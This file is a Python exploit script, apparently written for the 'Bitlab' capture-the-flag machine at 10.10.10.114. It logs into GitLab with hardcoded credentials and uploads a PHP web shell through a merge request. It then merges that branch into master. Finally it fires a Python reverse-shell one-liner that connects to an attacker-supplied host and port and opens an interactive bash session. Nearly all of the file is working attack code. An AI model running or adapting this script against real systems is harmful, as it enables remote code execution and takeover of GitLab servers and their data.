# -*- coding: utf-8 -*-

# Bitlab - GitLab Authenticated RCE
# CVE: -
# Exploit author: Renan Almeida
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import json
import requests
import sys
from pwn import *
from time import sleep


def main():
    
    # args    
    argparser = argparse.ArgumentParser(description='Bitlab - GitLab Authenticated RCE', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
    
    # session
    s = requests.Session()
    
    
    def string_generator(range_):
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(range_))
        
    
    def reverse_shell(l):
        
        print(" [*] Spawning the reverse shell...")
 
        l.sendline("""uname -a && id""")
        l.interactive()
    
    def grab_csrf():
        
        print(" [*] Grabbing the GitLab CSRF token...")
        
        try:
            if burpsuite:
                r = s.get("http://10.10.10.114/", proxies=proxies)
            else:
                r = s.get("http://10.10.10.114/")
        
        except Exception as e:
            print(e)
            print(" [*] Failed to grab the CSRF token...")
        
        else:
            print(" [*] CSRF token grabbed with success!")
            csrf_token = r.text.split('<meta name="csrf-token" content="')[1].split('" />')[0]
            
        return csrf_token
    
    
    def login():
    
        login_params = {
            "utf8": "✓",
            "authenticity_token": "",
            "user[login]": "clave",
            "user[password]": "11des0081x",
            "user[remember_me]": "0"          
        }
        
        login_params['authenticity_token'] = grab_csrf()
        
        print(" [*] Logging into GitLab...")
        
        try:   
            if burpsuite:
                r = s.post("http://10.10.10.114/users/sign_in", 
                                                    params=login_params,
                                                    proxies=proxies)
            
            else:
                r = s.post("http://10.10.10.114/users/sign_in", 
                                                    params=login_params)
                                                   
        except Exception as e:
            print(e)
            print(" [*] Failed to login on GitLab due an error!")
            sys.exit(1)
        
        else:
            if "sign_in" not in r.url:
                print(" [*] Login with success!")
                return True
            
            else:
                print(" [*] Failed to login on GitLab!")
    
    
    def upload_and_merge():
        
        csrf_token = grab_csrf()
            
        print(" [*] Generating the tmp web shell...")
        
        try:
            with open('/tmp/{}.php'.format(randname),'w') as f:
                f.write('<?php system($_GET["cmd"]) ?>')
                f.close()
        
        except Exception as e:
            print(e)
            print(" [*] Failed to generate the web shell...")
            sys.exit(1)
           
            
        files = {
            'file': ('{}.php'.format(randname), open('/tmp/{}.php'.format(randname), 'rb'), 'application/x-php'),
            'commit_message': (None, "Upload New File"),
            'create_merge_request': (None, 1),
            'branch_name': (None, randname)
        }
        
        headers = {"X-CSRF-Token": csrf_token}
        
        print(" [*] Uploading the web shell...")
        
        try: 
            if burpsuite:
                r = s.post("http://10.10.10.114/root/profile/create/master", 
                                                                    files=files,
                                                                    headers=headers,
                                                                    proxies=proxies)
            
            else:
                r = s.post("http://10.10.10.114/root/profile/create/master", 
                                                                    files=files,
                                                                    headers=headers)
        
        except Exception as e:
            print(e)
            print(" [*] Failed to upload the webshell due an error!")
            sys.exit(1)
        
        else:
            if "new?merge_request" in r.url:
                
                csrf_token = grab_csrf()
                
                params = {
                    "utf8": "✓",
                    "authenticity_token": csrf_token,
                    "merge_request[title]": "Upload New File",
                    "merge_request[description]": "",
                    "merge_request[assignee_id]": "2",
                    "merge_request[label_ids][]": "",
                    "merge_request[force_remove_source_branch]": "0",
                    "merge_request[squash]": "0",
                    "merge_request[lock_version]": "",
                    "merge_request[source_project_id]": "2",
                    "merge_request[source_branch]": randname,
                    "merge_request[target_project_id]": "2",
                    "merge_request[target_branch]": "master"
                }
                
                print(" [*] Merging the malicious branch with the master branch...")
                
                try:
                    if burpsuite:
                        r = s.post("http://10.10.10.114/root/profile/merge_requests", 
                                                                    params=params,
                                                                    proxies=proxies)
                    else:
                        r = s.post("http://10.10.10.114/root/profile/merge_requests", 
                                                                    params=params)
                                                                    
                except Exception as e:
                    print(e)
                    print(" [*] Failed to merge the malicious branch with master branch due an error!")
                    sys.exit(1)
                
                else:
                    csrf_token = grab_csrf()
                    headers = {"X-CSRF-Token": csrf_token}
                    
                    try:
                        if burpsuite:
                            json_msg = json.loads(s.get(r.url + ".json").text)
                            sha1 = json_msg['diff_head_sha']
                            commit_msg = json_msg['merge_commit_message_with_description']
                            
                            params = {
                                "sha": sha1,
                                "commit_message": commit_msg,
                                "merge_when_pipeline_succeeds": "false",
                                "should_remove_source_branch": "false",
                                "squash": "false"
                            }
                            
                            r = s.post(r.url + "/merge", headers=headers,
                                                         params=params,
                                                         proxies=proxies)
                        
                        else:
                            json_msg = json.loads(s.get(r.url + ".json").text)
                            sha1 = json_msg['diff_head_sha']
                            commit_msg = json_msg['merge_commit_message_with_description']
                            
                            params = {
                                "sha": sha1,
                                "commit_message": commit_msg,
                                "merge_when_pipeline_succeeds": False,
                                "should_remove_source_branch": False,
                                "squash": False
                            }
                            
                            r = s.post(r.url + "/merge", json=params,
                                                         headers=headers)
                    
                    except Exception as e:
                        print(e)
                    
                    else:
                        status = json.loads(r.text)
                        
                        if status['status'] == "success":
                            print(" [*] Webshell uploaded and malicious branch merged with master!")
                            return True
                        
                        else:
                            print(" [*] Failed to upload the webshell and merge with the master branch")
                            sys.exit(1)
                        
                    
            else:
                print(" [*] Failed to upload the webshell :(")
                
    
    def trigger_exploit():
         
        print(" [*] Waiting 10 seconds to trigger the webshell RCE...")
        sleep(10)
        
        print(" [*] Triggering the webshell RCE...")
        
        py_payload = "python -c 'import socket,subprocess,os;"
        py_payload += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        py_payload += "s.connect((\"{}\",{}));".format(lhost, lport)
        py_payload += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        py_payload += "p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        
        l = listen(lport)
        
        try:
            if burpsuite:
                r = s.get("http://10.10.10.114/profile/{}.php?cmd={}".format(randname, py_payload),
                                                                        proxies=proxies,
                                                                        timeout=1)     
           
            else:
                r = s.get("http://10.10.10.114/profile/{}.php?cmd={}".format(randname, py_payload),
                                                                        timeout=1)
            
        except Exception as e:
            reverse_shell(l)
            
    
    # main
    print(" [>] Bitlab - GitLab Authenticated RCE")
    print(" [*] Python script exploit author: nullarmor")
    
    randname = string_generator(8)
    
    if login():
        if upload_and_merge():
            trigger_exploit()  

if __name__ == "__main__":
    main()
